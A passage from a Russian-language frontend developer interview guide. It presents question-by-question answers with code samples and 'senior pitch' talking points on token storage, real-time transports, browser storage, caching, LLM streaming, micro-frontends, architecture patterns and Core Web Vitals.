  Response: Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax; Max-Age=900
            Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh

GET /api/data →
  Browser: автоматически шлёт access_token куки
  Server: проверяет токен, отдаёт данные

GET /api/data → 401 Unauthorized (access_token истёк) →
  POST /auth/refresh →
    Browser: шлёт refresh_token куки
    Server: выдаёт новую пару токенов
```

```js
// ❌ localStorage — XSS украдёт токен
localStorage.setItem('token', accessToken);
// Любой JS на странице: localStorage.getItem('token')

// ❌ В памяти (переменная) — теряется при обновлении страницы

// ✅ httpOnly куки — JS не имеет доступа
// Браузер сам подшивает к запросам. XSS не достанет.

// Axios интерцептор для автоматического рефреша
axios.interceptors.response.use(
  response => response,
  async error => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      await axios.post('/auth/refresh'); // обновляем куки
      return axios(error.config);       // повторяем оригинальный запрос
    }
    return Promise.reject(error);
  }
);
```

**🗣️ Pitch (Senior):**
> *"Хранить JWT в localStorage — красная карточка в банке. Любой XSS или заражённый npm-пакет украдёт токен через `window.localStorage`. httpOnly куки недоступны для JS — браузер сам управляет ими. Refresh Token с `SameSite=Strict` даёт максимальную защиту от CSRF на `/auth/refresh` эндпоинте."*

---

### ❓ Q70. WebSocket vs SSE vs Long Polling?

**Официальный ответ:**

```js
// WebSocket — двустороннее соединение (чат, онлайн-игры, торговые терминалы)
class ReliableWebSocket {
  constructor(url) {
    this.url = url;
    this.reconnectDelay = 1000;
    this.connect();
  }

  connect() {
    this.ws = new WebSocket(this.url);

    this.ws.onopen = () => {
      this.reconnectDelay = 1000; // сброс задержки при успехе
      this.startHeartbeat();
    };

    this.ws.onclose = () => {
      this.stopHeartbeat();
      // Экспоненциальный backoff реконнект
      setTimeout(() => this.connect(), this.reconnectDelay);
      this.reconnectDelay = Math.min(this.reconnectDelay * 2, 30000);
    };

    this.ws.onmessage = ({ data }) => {
      const msg = JSON.parse(data);
      if (msg.type === 'pong') {
        clearTimeout(this.pongTimeout);
      } else {
        this.onMessage(msg);
      }
    };
  }

  startHeartbeat() {
    this.pingInterval = setInterval(() => {
      this.ws.send(JSON.stringify({ type: 'ping' }));
      // Если pong не пришёл за 10 сек — соединение мёртвое (балансировщик убил тихо)
      this.pongTimeout = setTimeout(() => this.ws.close(), 10_000);
    }, 30_000);
  }
}
```

```js
// SSE — односторонний стриминг от сервера (LLM ответы, уведомления, тикеры)
async function streamLLMResponse(prompt, onChunk, onDone) {
  const res = await fetch('/api/llm/stream', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ prompt }),
  });

  const reader = res.body.getReader();
  // Один TextDecoder на всю сессию — буферизует разрезанные unicode символы
  const decoder = new TextDecoder('utf-8');

  while (true) {
    const { done, value } = await reader.read();
    if (done) { onDone(); break; }

    const chunk = decoder.decode(value, { stream: true });
    // Парсим SSE формат: "data: {...}\n\n"
    chunk.split('\n\n').forEach(line => {
      if (line.startsWith('data: ')) {
        const data = JSON.parse(line.slice(6));
        onChunk(data.text);
      }
    });
  }
}
```

**🗣️ Pitch (Senior):**
> *"Для LLM streaming — строго SSE. Модель выдаёт текст порционно, серверу не нужно ничего слушать от клиента после первого запроса. WebSocket избыточен. Критичный момент: один `TextDecoder` на сессию с `{ stream: true }` — он буферизует разрезанные UTF-8 символы (эмодзи занимают 4 байта, чанк может прийти посередине)."*

---

### ❓ Q71. IndexedDB vs localStorage vs sessionStorage?

**Официальный ответ:**

| | localStorage | sessionStorage | IndexedDB |
|---|---|---|---|
| Размер | ~5-10MB | ~5MB | Гигабайты |
| Тип | Строки | Строки | Объекты, Blob, Binary |
| API | Синхронный ❌ | Синхронный ❌ | Асинхронный ✅ |
| Время жизни | Постоянно | До закрытия вкладки | Постоянно |
| Worker доступ | ❌ | ❌ | ✅ |

```js
// localStorage — синхронный (блокирует Main Thread!)
localStorage.setItem('key', JSON.stringify(data)); // блокирует!
const val = JSON.parse(localStorage.getItem('key'));

// Хорошо для: небольших настроек, токенов (если не httpOnly), тем
// Плохо для: больших данных (зависнет UI)
```

```js
// IndexedDB через обёртку idb (google/idb)
import { openDB } from 'idb';

const db = await openDB('myapp', 1, {
  upgrade(db) {
    db.createObjectStore('messages', { keyPath: 'id', autoIncrement: true });
    db.createObjectStore('cache', { keyPath: 'url' });
  },
});

// Сохранить
await db.put('messages', { text: 'Hello', timestamp: Date.now() });

// Получить
const messages = await db.getAll('messages');

// Транзакция
const tx = db.transaction(['messages', 'cache'], 'readwrite');
await tx.objectStore('messages').put({ text: 'Hello' });
await tx.objectStore('cache').put({ url: '/api/data', data: {...} });
await tx.done;
```

---

### ❓ Q72. Service Workers и стратегии кэширования?

**Официальный ответ:**

```js
// service-worker.js
const CACHE_NAME = 'myapp-v1';
const STATIC_ASSETS = ['/index.html', '/main.js', '/style.css'];

// Install — кэшируем статику
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then(cache => cache.addAll(STATIC_ASSETS))
  );
});

// Fetch — стратегия по типу ресурса
self.addEventListener('fetch', (event) => {
  const { request } = event;
  const url = new URL(request.url);

  if (url.pathname.startsWith('/api/')) {
    // Network First — для API (свежие данные важнее)
    event.respondWith(networkFirst(request));
  } else if (STATIC_ASSETS.includes(url.pathname)) {
    // Cache First — для статики (она не меняется без нового деплоя)
    event.respondWith(cacheFirst(request));
  } else {
    // Stale-while-revalidate — для картинок, шрифтов
    event.respondWith(staleWhileRevalidate(request));
  }
});

async function networkFirst(request) {
  try {
    const response = await fetch(request);
    const cache = await caches.open(CACHE_NAME);
    cache.put(request, response.clone()); // обновляем кэш
    return response;
  } catch {
    return caches.match(request); // оффлайн-фолбэк
  }
}

async function staleWhileRevalidate(request) {
  const cached = await caches.match(request);
  const networkPromise = fetch(request).then(response => {
    caches.open(CACHE_NAME).then(cache => cache.put(request, response.clone()));
    return response;
  });
  return cached || networkPromise; // мгновенно из кэша, обновляем за кулисами
}
```

---

### ❓ Q74. Хэширование файлов и Cache-Control?

**Официальный ответ:**

```js
// vite.config.js / webpack.config.js
export default {
  build: {
    rollupOptions: {
      output: {
        // contenthash: файл меняется → хэш меняется → новый URL
        entryFileNames: 'assets/[name].[hash].js',
        chunkFileNames: 'assets/[name].[hash].js',
        assetFileNames: 'assets/[name].[hash][extname]',
      }
    }
  }
}
// main.js → main.a3f2b1.js
// Если код изменился → main.c8d4e2.js (новый URL → новый кэш)
// Если не изменился → тот же URL → браузер берёт из кэша
```

```nginx
# nginx.conf — стратегия кэширования

# index.html — НЕ кэшировать (всегда проверять)
location = /index.html {
    add_header Cache-Control "no-cache, must-revalidate";
}

# Хэшированные файлы — кэш на год (immutable)
location ~* \.[a-f0-9]{8}\. {
    add_header Cache-Control "public, max-age=31536000, immutable";
    # immutable = браузер даже не делает conditional GET при refresh
}
```

**🗣️ Pitch (Senior):**
> *"Contenthash — основа CD без даунтайма: `index.html` без кэша (браузер всегда проверяет) + хэшированные бандлы с кэшем на год (`immutable`). Деплой = новые хэши в JS/CSS + обновлённый index.html с новыми ссылками. Пользователи автоматически получат новую версию при следующем посещении."*

---

## РАЗДЕЛ 10: AI & Generative UI

---

### ❓ Q76. Чтение AI Streaming (ReadableStream)?

**Официальный ответ:**

```js
// React хук для стриминга LLM ответа
function useStreamingChat() {
  const [content, setContent] = useState('');
  const [isStreaming, setIsStreaming] = useState(false);

  const sendMessage = async (prompt) => {
    setContent('');
    setIsStreaming(true);

    const res = await fetch('/api/chat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: prompt }),
    });

    if (!res.ok) throw new Error(`HTTP ${res.status}`);

    const reader = res.body.getReader();
    // Один декодер на всю сессию — буферизует Unicode (эмодзи = 4 байта!)
    const decoder = new TextDecoder('utf-8');

    try {
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;

        const chunk = decoder.decode(value, { stream: true });
        setContent(prev => prev + chunk);
      }
    } finally {
      setIsStreaming(false);
      // Финальный decode без stream:true — сбрасывает буфер
      const remaining = decoder.decode();
      if (remaining) setContent(prev => prev + remaining);
    }
  };

  return { content, isStreaming, sendMessage };
}
```

---

### ❓ Q77. Generative UI (Function Calling / Tool Use)?

**Официальный ответ:**

```js
// Vercel AI SDK паттерн упрощённо
const tools = {
  showProductCard: {
    description: 'Показать карточку товара',
    parameters: z.object({
      productId: z.string(),
      highlight: z.enum(['price', 'rating', 'stock']).optional(),
    }),
    // Рендер React компонента из LLM вызова
    generate: async function*({ productId, highlight }) {
      yield <ProductSkeleton />;      // пока LLM думает

      const product = await fetchProduct(productId);
      yield <ProductCard product={product} highlight={highlight} />;
    },
  },

  showChart: {
    description: 'Показать график данных',
    parameters: z.object({
      data: z.array(z.object({ date: z.string(), value: z.number() })),
      type: z.enum(['line', 'bar', 'pie']),
    }),
    generate: async function*({ data, type }) {
      yield <ChartSkeleton />;
      yield <Chart data={data} type={type} />;
    },
  },
};
```

**🗣️ Pitch (Senior):**
> *"Function Calling: модель не выполняет JS — она возвращает формализованный JSON `{ tool: 'showProductCard', args: { productId: '123' } }`. Фронтенд парсит это и рендерит соответствующий React компонент. Самое сложное — обработка стримингового JSON: пока модель генерирует `{ 'type': 'prod`, парсер Zod упадёт. Решение: partial JSON парсеры + Suspense для отображения скелетона до полного получения."*

---

### ❓ Q80. Prefix Caching в LLM запросах?

**Официальный ответ:**

```js
// ❌ Плохая архитектура — кэш слетает при каждом запросе
async function badChat(userMessage, ragDocuments) {
  return llm.complete({
    messages: [
      {
        role: 'system',
        // RAG документы меняются → кэш слетает → дорого!
        content: `Ты помощник банка. Документы: ${ragDocuments.join('\n')} ...`
      },
      ...conversationHistory,
      { role: 'user', content: userMessage },
    ]
  });
}

// ✅ Хорошая архитектура — статика в начале, динамика в конце
async function goodChat(userMessage, ragDocuments) {
  return llm.complete({
    messages: [
      {
        role: 'system',
        // Статичный системный промпт ВСЕГДА первый — кэшируется Anthropic/OpenAI
        content: `Ты помощник банка. Отвечай вежливо. Не давай финансовых советов без оговорок.`
      },
      // RAG документы — отдельным сообщением (тоже можно кэшировать если стабильны)
      {
        role: 'user',
        content: `Контекст из базы знаний:\n${ragDocuments.join('\n')}`
      },
      // История диалога — в середине
      ...conversationHistory,
      // Только текущий запрос меняется — в конце
      { role: 'user', content: userMessage },
    ]
  });
}
// Anthropic Prefix Caching: ~90% скидка на кэшированные токены!
```

**🗣️ Pitch (Senior):**
> *"Prefix Caching диктует архитектуру сторов. Системные промпты — всегда первыми и статично. Динамика (RAG документы, пользовательский контекст) — в конце. Если встроить меняющийся контекст в system prompt — кэш слетит и стоимость вырастет в разы. В больших проектах это разница в десятки тысяч долларов в месяц."*

---

## РАЗДЕЛ 11: System Design & Паттерны

---

### ❓ Q81. Dependency Injection (DI) и IoC?

**Официальный ответ:**

```js
// ❌ Tight coupling — компонент создаёт зависимость сам
function UserProfile({ userId }) {
  // Компонент напрямую зависит от конкретной реализации
  const [user, setUser] = useState(null);
  useEffect(() => {
    fetch(`/api/users/${userId}`).then(r => r.json()).then(setUser);
  }, [userId]);
}
// Как тестировать? Как использовать в Storybook? Сложно!
```

```js
// ✅ DI через React Context — IoC контейнер
// Определяем ИНТЕРФЕЙС
const ApiContext = createContext(null);

// Production реализация
const productionApi = {
  getUser: (id) => fetch(`/api/users/${id}`).then(r => r.json()),
  updateUser: (id, data) => fetch(`/api/users/${id}`, { method: 'PUT', body: JSON.stringify(data) }).then(r => r.json()),
};

// Mock реализация для тестов/Storybook
const mockApi = {
  getUser: (id) => Promise.resolve({ id, name: 'Alice', role: 'admin' }),
  updateUser: (id, data) => Promise.resolve({ id, ...data }),
};

// Provider (меняем реализацию в одном месте)
function App() {
  return (
    <ApiContext.Provider value={productionApi}>
      <UserProfile userId="123" />
    </ApiContext.Provider>
  );
}

// Компонент — зависит от абстракции, не реализации
function UserProfile({ userId }) {
  const api = useContext(ApiContext);
  const [user, setUser] = useState(null);
  useEffect(() => {
    api.getUser(userId).then(setUser);
  }, [userId, api]);
}
```

---

### ❓ Q82. FSD (Feature-Sliced Design)?

**Официальный ответ:**

```
src/
├── app/           ← инициализация, провайдеры, роутер, глобальные стили
├── pages/         ← страницы (объединяют widgets для конкретного роута)
├── widgets/       ← самодостаточные блоки UI (Header, Sidebar, ProductCard)
├── features/      ← бизнес-действия (auth, search, cart, like-post)
├── entities/      ← бизнес-сущности (user, product, order, payment)
└── shared/        ← переиспользуемые утилиты (ui-kit, api, lib, types, config)

ПРАВИЛО: импорт только ВНИЗ по слоям:
  app → pages → widgets → features → entities → shared
  
features НЕ импортирует features  ❌
entities НЕ импортирует features  ❌
shared НЕ импортирует entities    ❌
```

```js
// ✅ Структура фичи (например features/auth)
features/auth/
├── ui/           LoginForm.tsx, RegisterModal.tsx
├── model/        authStore.ts, useAuth.ts, authSlice.ts
├── api/          authApi.ts (RTK Query или Axios функции)
├── lib/          validatePassword.ts, formatAuthError.ts
└── index.ts      ← публичный API фичи (только то что нужно снаружи)
```

```js
// ESLint защита от нарушений FSD
// .eslintrc.js
module.exports = {
  plugins: ['boundaries'],
  rules: {
    'boundaries/element-types': ['error', {
      default: 'disallow',
      rules: [
        { from: 'shared',   allow: [] },
        { from: 'entities', allow: ['shared'] },
        { from: 'features', allow: ['shared', 'entities'] },
        { from: 'widgets',  allow: ['shared', 'entities', 'features'] },
        { from: 'pages',    allow: ['shared', 'entities', 'features', 'widgets'] },
        { from: 'app',      allow: ['shared', 'entities', 'features', 'widgets', 'pages'] },
      ],
    }],
  },
};
```

**🗣️ Pitch (Senior):**
> *"FSD решает проблему 'клубка спагетти' в больших командах. Feature не зависит от другой Feature — если нужно объединить логику (Лайк + Подписка) делаем это на уровне Widgets или Pages. eslint-plugin-boundaries на CI автоматически бьёт по рукам при попытке нарушить иерархию — junior не сможет случайно создать circular dependency."*

---

### ❓ Q83. Backend-Driven UI (BDUI)?

**Официальный ответ:**

```js
// Бэкенд возвращает СТРУКТУРУ UI, а не только данные
// API response:
{
  "screen": {
    "type": "card",
    "title": "Вклад 'Накопительный'",
    "components": [
      { "type": "text", "value": "Ставка: 12% годовых", "style": "highlight" },
      { "type": "button", "label": "Открыть вклад", "action": "OPEN_DEPOSIT", "style": "primary" },
      { "type": "link", "label": "Подробнее", "url": "/deposits/details" }
    ]
  }
}

// Фронтенд — "тупой" интерпретатор JSON
function BDUIRenderer({ component }) {
  switch (component.type) {
    case 'card':
      return (
        <Card title={component.title}>
          {component.components.map((c, i) => (
            <BDUIRenderer key={i} component={c} />
          ))}
        </Card>
      );
    case 'text':
      return <Text style={component.style}>{component.value}</Text>;
    case 'button':
      return (
        <Button
          variant={component.style}
          onPress={() => handleAction(component.action)}
        >
          {component.label}
        </Button>
      );
    case 'link':
      return <Link href={component.url}>{component.label}</Link>;
    default:
      return null;
  }
}
```

**🗣️ Pitch (Senior):**
> *"Огромный бизнес-плюс BDUI: выкатываем изменения UI без обновления мобильного приложения в App Store (проверка = дни/недели). Меняем кнопки, текст, порядок блоков — чисто с бэка. Использовал в Сбере для модулей депозитов. Ограничение: сложная анимация и специфичные интеракции всё равно требуют нативного кода."*

---

### ❓ Q84. Microfrontends и Module Federation?

**Официальный ответ:**

```js
// webpack.config.js (Remote — "deposits" приложение)
new ModuleFederationPlugin({
  name: 'deposits',
  filename: 'remoteEntry.js',
  exposes: {
    './DepositsPage': './src/pages/DepositsPage',
    './DepositWidget': './src/widgets/DepositWidget',
  },
  shared: {
    // singleton: true — только ОДИН React в браузере (от Host)
    react: { singleton: true, requiredVersion: '^18.0.0', eager: true },
    'react-dom': { singleton: true, eager: true },
    // Стейт-менеджер тоже должен быть singleton!
    zustand: { singleton: true },
  },
})

// webpack.config.js (Host — "banking" shell приложение)
new ModuleFederationPlugin({
  name: 'banking',
  remotes: {
    // URL подгружается В РАНТАЙМЕ браузера (не в момент сборки!)
    deposits: 'deposits@https://deposits.bank.com/remoteEntry.js',
    credits:  'credits@https://credits.bank.com/remoteEntry.js',
  },
  shared: { react: { singleton: true, eager: true } },
})
```

```js
// Host использует Remote компоненты
const DepositsPage = React.lazy(() => import('deposits/DepositsPage'));
const DepositWidget = React.lazy(() => import('deposits/DepositWidget'));

function BankingApp() {
  return (
    <Suspense fallback={<PageSkeleton />}>
      <Routes>
        <Route path="/deposits" element={<DepositsPage />} />
      </Routes>
    </Suspense>
  );
}
```

**🗣️ Pitch (Senior):**
> *"Главная боль микрофронтов — дублирование React и стейт-менеджеров: если Remote загружает свой React, он конфликтует с React Host-а (хуки падают с 'invalid hook call'). Module Federation решает через `singleton: true`: Host загружает React один раз, все Remote переиспользуют. TypeScript поддержка — через `@module-federation/typescript` плагин."*

---

### ❓ Q85. Event Bus в Microfrontends?

**Официальный ответ:**

```ts
// Типизированный Event Bus SDK (публикуется в приватный npm)
// packages/event-bus-sdk/index.ts

type BankingEvents = {
  'user:logout': { reason: 'timeout' | 'manual' };
  'cart:updated': { itemCount: number; total: number };
  'deposit:opened': { depositId: string; amount: number; currency: 'RUB' | 'USD' };
  'notification:show': { message: string; type: 'success' | 'error' | 'info' };
};

class TypedEventBus {
  private readonly NAMESPACE = 'banking:';

  emit<K extends keyof BankingEvents>(
    event: K,
    data: BankingEvents[K]
  ): void {
    window.dispatchEvent(
      new CustomEvent(`${this.NAMESPACE}${event}`, { detail: data })
    );
  }

  on<K extends keyof BankingEvents>(
    event: K,
    handler: (data: BankingEvents[K]) => void
  ): () => void {
    const listener = (e: CustomEvent) => handler(e.detail);
    const eventName = `${this.NAMESPACE}${event}`;
    window.addEventListener(eventName, listener as EventListener);
    return () => window.removeEventListener(eventName, listener as EventListener);
  }
}

export const eventBus = new TypedEventBus();

// Использование в микрофронте "deposits":
import { eventBus } from '@bank/event-bus-sdk';

eventBus.emit('deposit:opened', { depositId: '123', amount: 50000, currency: 'RUB' });

// Использование в микрофронте "notifications":
const unsubscribe = eventBus.on('deposit:opened', ({ depositId, amount }) => {
  showToast(`Вклад открыт на ${formatAmount(amount)}`);
});
// При размонтировании:
unsubscribe();
```

---

### ❓ Q87. SOLID принципы в React?

**Официальный ответ:**

```tsx
// S — Single Responsibility: компонент делает одно
// ❌ Fat component
function UserDashboard({ userId }) {
  // данные + логика + рендер + форматирование — всё в одном
  const [user, setUser] = useState(null);
  useEffect(() => { fetch(`/api/users/${userId}`).then(/*...*/); }, []);
  return <div>{/* 200 строк JSX */}</div>;
}

// ✅ Разделяем
function useUser(userId) { /* только данные */ }
function UserCard({ user }) { /* только UI */ }
function UserDashboard({ userId }) {
  const { user } = useUser(userId);
  return <UserCard user={user} />;
}
```

```tsx
// O — Open/Closed: расширяем без изменения
// ❌ Закрытый для расширения
function Button({ variant }: { variant: 'primary' | 'secondary' }) {
  if (variant === 'primary') return <button className="btn-primary" />;
  if (variant === 'secondary') return <button className="btn-secondary" />;
  // Каждый новый вариант = изменение Button
}

// ✅ Открытый для расширения через children/render props
function Button({ children, className, ...rest }: React.ButtonHTMLAttributes<HTMLButtonElement>) {
  return <button className={cn('btn', className)} {...rest}>{children}</button>;
}
// Новые варианты через обёртку, не изменяя базовый Button:
const PrimaryButton = (props) => <Button className="btn-primary" {...props} />;
```

```tsx
// L — Liskov: кастомные компоненты принимают стандартные атрибуты
// ❌ Нарушение: обёртка над input не принимает стандартные HTML атрибуты
function Input({ label }: { label: string }) { /* нет ...rest */ }

// ✅
interface InputProps extends React.InputHTMLAttributes<HTMLInputElement> {
  label: string;
  error?: string;
}
function Input({ label, error, ...rest }: InputProps) {
  return (
    <div>
      <label>{label}</label>
      <input {...rest} />  {/* все стандартные атрибуты работают */}
      {error && <span>{error}</span>}
    </div>
  );
}
```

```tsx
// I — Interface Segregation: не тяни лишнее
// ❌ Передаём весь объект User в компонент которому нужно только имя
function UserAvatar({ user }: { user: User }) {
  return <img src={user.avatar} alt={user.name} />; // использует 2 из 20 полей
}

// ✅ Передаём только нужное
function UserAvatar({ avatar, name }: { avatar: string; name: string }) {
  return <img src={avatar} alt={name} />;
}
```

---

### ❓ Q94. Runtime Validation vs Static Type Checking (Zod)?

**Официальный ответ:**

```ts
// TypeScript исчезает в рантайме — защищает только от вас самих
// Zod/Yup защищают от внешнего мира (API, пользователей)

import { z } from 'zod';

// 1. Определяем схему (один источник правды)
const UserSchema = z.object({
  id: z.string().uuid(),
  name: z.string().min(2).max(50),
  email: z.string().email(),
  age: z.number().int().min(18).max(120).optional(),
  role: z.enum(['admin', 'user', 'moderator']),
  createdAt: z.string().datetime(),
});

// 2. Автоматически получаем TypeScript тип (DRY!)
type User = z.infer<typeof UserSchema>;

// 3. Валидируем API ответ
async function fetchUser(id: string): Promise<User> {
  const raw = await fetch(`/api/users/${id}`).then(r => r.json());

  // parse — бросает ZodError с понятным описанием если невалидно
  return UserSchema.parse(raw);

  // safeParse — не бросает, возвращает { success, data } или { success: false, error }
  const result = UserSchema.safeParse(raw);
  if (!result.success) {
    console.error(result.error.issues); // детальный список ошибок
    throw new Error('Invalid API response');
  }
  return result.data; // тип: User (автоматически!)
}
```

```ts
// React Hook Form + Zod — идеальная связка
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

const LoginSchema = z.object({
  email: z.string().email('Введите корректный email'),
  password: z.string().min(8, 'Минимум 8 символов'),
});
type LoginForm = z.infer<typeof LoginSchema>;

function LoginPage() {
  const { register, handleSubmit, formState: { errors } } = useForm<LoginForm>({
    resolver: zodResolver(LoginSchema), // одна схема = валидация + типы
  });

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('email')} />
      {errors.email && <span>{errors.email.message}</span>}
      <input type="password" {...register('password')} />
      {errors.password && <span>{errors.password.message}</span>}
    </form>
  );
}
```

**🗣️ Pitch (Senior):**
> *"TypeScript защищает от тебя самого (опечатки, неверные типы в коде). Zod защищает от внешнего мира: API может вернуть что угодно — неожиданный null, другую структуру после обновления бэка, строку вместо числа. `z.infer<typeof Schema>` — DRY: одна схема = валидация в рантайме + TypeScript типы. Это устраняет дрейф между типами и реальной структурой данных."*

---

### ❓ Q95. Hydration vs Resumability?

**Официальный ответ:**

```
Hydration (Next.js, Remix):
                    Сервер отрендерил HTML
                         │
             ┌───────────▼────────────┐
Browser      │ Показывает HTML        │ ← FCP (First Contentful Paint) быстрый
             │ [визуально выглядит]   │
             └───────────┬────────────┘
                         │ Загружает весь JS бандл
             ┌───────────▼────────────┐
             │ React "гидрирует" DOM  │ ← ДОЛГО на тяжёлых страницах!
             │ обходит всё дерево     │
             │ вешает event listeners │
             └───────────┬────────────┘
                         │ TTI (Time to Interactive) запоздал

Resumability (Qwik):
             HTML сразу с сериализованным состоянием
             JS-обработчики грузятся микро-чанками ТОЛЬКО при клике
             TTI ≈ FCP — нет этапа гидрации!
```

```jsx
// React Server Components (Next.js 13+) — промежуточный путь
// Server Component — выполняется ТОЛЬКО на сервере
async function ProductList() {
  // Прямо в компоненте! Нет fetch в useEffect
  const products = await db.query('SELECT * FROM products');

  return (
    <ul>
      {products.map(p => (
        // ProductCard — Client Component (кнопка нужна интерактивность)
        <ProductCard key={p.id} product={p} />
      ))}
    </ul>
  );
}
// Весь JS для ProductList НЕ отправляется в браузер (0 bytes JS!)
```

---

### ❓ Q97. BFF (Backend-For-Frontend) vs API Gateway?

**Официальный ответ:**

```
API Gateway (универсальный):          BFF (специфичный для клиента):
                                       
     Mobile    Web    TV                Mobile BFF    Web BFF
       │         │     │                    │               │
       └────┬────┘     │              ┌─────┘         ┌────┘
            ▼          ▼              ▼                ▼
        API Gateway                микросервисы (Users, Orders, Payments...)
            │
        микросервисы

API Gateway: маршрутизация, auth, rate limiting
BFF: агрегация данных, трансформация, специфика клиента
```

```ts
// BFF на NestJS — агрегирует 3 микросервиса в один удобный endpoint
@Controller('/dashboard')
class DashboardBFF {
  constructor(
    private users: UsersServiceClient,
    private orders: OrdersServiceClient,
    private payments: PaymentsServiceClient,
  ) {}

  @Get('/:userId')
  async getDashboard(@Param('userId') userId: string) {
    // Параллельные запросы к микросервисам
    const [user, recentOrders, balance] = await Promise.all([
      this.users.getUser(userId),
      this.orders.getRecentOrders(userId, { limit: 5 }),
      this.payments.getBalance(userId),
    ]);

    // Трансформируем под нужды Web клиента (Mobile BFF вернул бы другую структуру!)
    return {
      profile: { name: user.fullName, avatar: user.photoUrl },
      recentOrders: recentOrders.map(o => ({
        id: o.orderId,
        total: formatCurrency(o.totalAmount, user.currency),
        status: translateStatus(o.status, 'ru'),
      })),
      balance: formatCurrency(balance.amount, user.currency),
    };
  }
}
```

**🗣️ Pitch (Senior):**
> *"API Gateway — traffic cop, BFF — personal assistant. BFF пишет команда фронтенда на Node.js/NestJS. Они знают что нужно их UI и делают агрегацию/трансформацию на сервере. Фронтенд получает готовый JSON — только рендерить. Мобайл-команда делает свой Mobile BFF с другой структурой данных (меньше полей, другие форматы для нативного кода)."*

---

### ❓ Q98. Error Boundary + Suspense + Code Splitting?

**Официальный ответ:**

```jsx
// Изолированный цикл загрузки виджета
import { lazy, Suspense } from 'react';
import { ErrorBoundary } from 'react-error-boundary';

// Lazy loading — чанк грузится только когда нужен
const DepositsWidget = lazy(() => import('./widgets/DepositsWidget'));
const CreditsWidget = lazy(() => import('./widgets/CreditsWidget'));

// Fallback при ошибке рендера
function WidgetError({ error, resetErrorBoundary }) {
  return (
    <div className="widget-error">
      <p>Виджет временно недоступен</p>
      <button onClick={resetErrorBoundary}>Попробовать снова</button>
    </div>
  );
}

function Dashboard() {
  return (
    <div className="dashboard">
      {/* Каждый виджет изолирован: ошибка одного не ломает остальные */}
      <ErrorBoundary FallbackComponent={WidgetError}>
        <Suspense fallback={<WidgetSkeleton />}>
          <DepositsWidget />
          {/* Suspense перехватывает Promise (загрузку чанка)
              ErrorBoundary перехватывает Error (ошибку рендера) */}
        </Suspense>
      </ErrorBoundary>

      <ErrorBoundary FallbackComponent={WidgetError}>
        <Suspense fallback={<WidgetSkeleton />}>
          <CreditsWidget />
        </Suspense>
      </ErrorBoundary>
    </div>
  );
}
```

**🗣️ Pitch (Senior):**
> *"Три уровня защиты: `React.lazy` — defer загрузки чанка. `Suspense` — перехватывает брошенный Promise на этапе загрузки модуля, показывает скелетон. `ErrorBoundary` — перехватывает брошенные Error на этапе рендера, показывает fallback. Без ErrorBoundary ошибка в виджете 'Вклады' обрушит весь банкинг. С ним — только виджет, остальные работают."*

---

### ❓ Q99. Core Web Vitals (FCP, LCP, CLS, INP)?

**Официальный ответ:**

```html
<!-- FCP (First Contentful Paint) — когда появляется первый контент -->

<!-- ✅ Critical CSS — встроен в HEAD (не ждём загрузки .css файла) -->
<style>
  .hero { display: flex; align-items: center; }
  .header { height: 60px; background: #fff; }
</style>

<!-- ✅ Preload критичных ресурсов -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hero-image.webp" as="image">
```

```html
<!-- LCP (Largest Contentful Paint) — когда загружается главный контент -->

<!-- ✅ Главное изображение первого экрана — БЕЗ lazy! -->
<img
  src="/hero.webp"
  alt="Hero"
  width="800"
  height="400"
  fetchpriority="high"
/>
<!-- ❌ loading="lazy" на LCP-изображении = штраф к LCP! -->

<!-- Все остальные изображения — с lazy -->
<img src="/product.webp" alt="Product" loading="lazy" width="300" height="200" />
```

```html
<!-- CLS (Cumulative Layout Shift) — нет "прыжков" верстки -->

<!-- ✅ Всегда резервируй размер под изображения -->
<img src="/banner.jpg" width="1200" height="400" />
/* CSS */
.banner { aspect-ratio: 3 / 1; } /* альтернатива */

<!-- ✅ Нет баннеров без жёсткого контейнера -->
.ad-container { min-height: 90px; } /* резервируем место заранее */

<!-- ✅ Шрифты — font-display: optional или swap -->
@font-face {
  font-family: 'Inter';
  font-display: optional; /* не вызывает CLS если шрифт не загрузился вовремя */
}
```

```js
// INP (Interaction to Next Paint) — отзывчивость на взаимодействие
// Цель: < 200ms

// ❌ Тяжёлые синхронные операции в обработчике
button.addEventListener('click', () => {
  const result = heavyComputation(data); // блокирует Main Thread
  render(result);
});

// ✅ Разгрузить Main Thread
button.addEventListener('click', async () => {
  setLoading(true);        // быстрый визуальный отклик
  await sleep(0);          // отдаём управление браузеру для рендера
  const result = await computeInWorker(data); // тяжёлое в Worker
  render(result);
  setLoading(false);
});
```

---

## РАЗДЕЛ 12: Быстрые шпаргалки

---

### ⚡ Когда что использовать

| Задача | Инструмент |
|--------|-----------|
| Параллельные запросы, все критичны | `Promise.all` |
| Параллельные, падение одного — не конец | `Promise.allSettled` |
| Таймаут для запроса | `Promise.race` + `setTimeout` |
| Первый живой из зеркал | `Promise.any` |
| Отмена запроса при смене deps / размонтировании | `AbortController` |
| Кэш привязанный к объектам без утечек | `WeakMap` |
| Отслеживание без утечек | `WeakSet` |
| Уникальные значения + O(1) поиск | `Set` |
| Частые add/delete по ключу | `Map` |
| Глубокое копирование | `structuredClone` |
| Реактивность / перехват операций над объектом | `Proxy + Reflect` |
| Валюты, числа, даты | `Intl.NumberFormat / DateTimeFormat` |
| JS-анимации | `requestAnimationFrame` + `transform/opacity` |
| Фоновые некритичные задачи | `requestIdleCallback` |
| Видимость элемента | `IntersectionObserver` |
| Размеры элемента | `ResizeObserver` |
| LLM streaming | `SSE / ReadableStream` + `TextDecoder` |
| Двусторонний реалтайм | `WebSocket + Heartbeat + backoff reconnect` |
| Аналитика при закрытии вкладки | `navigator.sendBeacon` |
| Большие числа (финтех ID, крипто) | `BigInt` |
| Большие данные в браузере (offline) | `IndexedDB` |

---

### ⚡ TypeScript быстрые паттерны

```ts
// Union из массива констант (DRY)
const STATUSES = ['pending', 'success', 'failed'] as const;
